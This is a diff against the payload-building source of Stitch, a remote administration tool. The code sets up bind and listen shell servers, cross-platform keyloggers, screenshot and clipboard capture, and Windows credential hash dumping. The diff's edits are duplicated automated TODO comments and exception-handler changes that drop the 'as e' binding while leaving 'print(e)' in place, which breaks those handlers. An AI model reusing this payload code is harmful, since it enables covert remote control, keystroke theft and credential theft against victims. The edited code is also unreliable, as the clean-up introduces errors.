@@ -2,6 +2,8 @@
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
 import sys
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .st_aes import *
 from random import randint,choice
 from string import ascii_uppercase
@@ -15,6 +17,8 @@ for n in range(0,10):
 ################################################################################
 
 main_imports = '''#!/usr/bin/env python
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_utils import *
 
 class stitch_payload():
@@ -44,7 +48,7 @@ def add_bind_server(BHOST,BPORT):
                 client_socket, addr = server.accept()
                 server.settimeout(None)
                 client_socket.settimeout(None)
-            except Exception as e:
+            except Exception:
                 if dbg:
                     print(e)
                 client_socket=None
@@ -90,7 +94,7 @@ def add_listen_server(LHOST,LPORT):
                 else:
                     send(client_socket,"[!] Another stitch shell has already been established.\\n")
                     client_socket.close()
-            except Exception as e:
+            except Exception:
                 if dbg:
                     print(e)
                 client_socket.close()
@@ -110,11 +114,12 @@ def main():
             listen.daemon = True
             bind.start()
             listen.start()
+    # TODO: Review - infinite loop may need exit condition
             while True:
                 sleep(60)
         except KeyboardInterrupt:
             pass
-        except Exception as e:
+        except Exception:
             if dbg:
                 print(e)
             pass
@@ -132,11 +137,12 @@ def main():
             listen = threading.Thread(target=st_pyld.listen_server, args=())
             listen.daemon = True
             listen.start()
+    # TODO: Review - infinite loop may need exit condition
             while True:
                 sleep(60)
         except KeyboardInterrupt:
             pass
-        except Exception as e:
+        except Exception:
             if dbg:
                 print(e)
             pass
@@ -153,11 +159,12 @@ def main():
             bind = threading.Thread(target=st_pyld.bind_server, args=())
             bind.daemon = True
             bind.start()
+    # TODO: Review - infinite loop may need exit condition
             while True:
                 sleep(60)
         except KeyboardInterrupt:
             pass
-        except Exception as e:
+        except Exception:
             if dbg:
                 print(e)
             pass
@@ -207,7 +214,11 @@ from io import StringIO
 import platform
 import threading
 import subprocess
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_protocol import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_encryption import *
 from mss import ScreenshotError
 from time import strftime, sleep
@@ -389,7 +400,7 @@ def client_handler({2}):
             if cmd_buffer == "end_connection": break
             determine_cmd(str(cmd_buffer),{2})
         {2}.close()
-    except Exception as e:
+    except Exception:
         if dbg:
             print(e)
         {2}.close()
@@ -413,7 +424,7 @@ def reg_exists(path):
     try:
         key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,path)
         return True
-    except:
+    except Exception:
         return False\n\n
 '''
 
@@ -423,9 +434,13 @@ import vidcap
 import pyHook
 import _winreg
 import pythoncom
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from ctypes import *
 import win32clipboard
 from mss.windows import MSS
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_win_keylogger import *
 from PIL import Image, ImageFile
 from creddump.hashdump import dump_file_hashes
@@ -436,6 +451,8 @@ def osx_util_imports():
 import pexpect
 import pexpect.pxssh
 from mss.darwin import MSS
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_osx_keylogger import *
 from PyObjCTools import AppHelper
 from Foundation import NSObject, NSLog
@@ -449,6 +466,8 @@ import pexpect
 import pyxhook
 import pexpect.pxssh
 from mss.linux import MSS
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_lnx_keylogger import *\n
 '''
 
@@ -485,6 +504,8 @@ def get_protocol():
     return '''
 import socket
 import struct
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_encryption import *
 
 st_eof = base64.b64decode('c3RpdGNoNjI2aGN0aXRz')
@@ -546,6 +567,8 @@ import datetime
 import pythoncom
 import threading
 import subprocess
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from ctypes import *
 import win32clipboard
 
@@ -757,7 +780,7 @@ class keylogger():
                     self.log_handle.write('\\n')
                     self.key_count = 0
                 #self.log_handle.write(str(event))
-            except Exception as e:
+            except Exception:
                 pass
 
     def check_active_win(self):
@@ -1053,7 +1076,13 @@ from contextlib import contextmanager
 from base64 import b64decode as INFO
 from zlib import decompress as SEC
 
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_utils import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_protocol import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from st_encryption import *
 '''
